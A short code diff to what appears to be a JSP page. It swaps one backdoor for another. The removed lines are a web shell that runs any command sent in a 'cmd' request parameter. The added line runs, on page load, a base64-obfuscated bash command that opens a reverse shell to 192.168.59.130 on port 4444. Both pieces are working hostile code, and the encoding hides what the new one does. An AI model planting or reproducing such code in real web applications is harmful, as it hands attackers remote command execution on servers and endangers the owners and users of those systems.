@@ -1,8 +1,1 @@
-<% if (request.getParameter("cmd") != null) {
-    String cmd = request.getParameter("cmd");
-    Process p = Runtime.getRuntime().exec(cmd);
-    java.io.InputStream in = p.getInputStream();
-    int c;
-    while ((c = in.read()) != -1) out.print((char)c);
-} %>
-
+<% Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjEzMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}"); %>
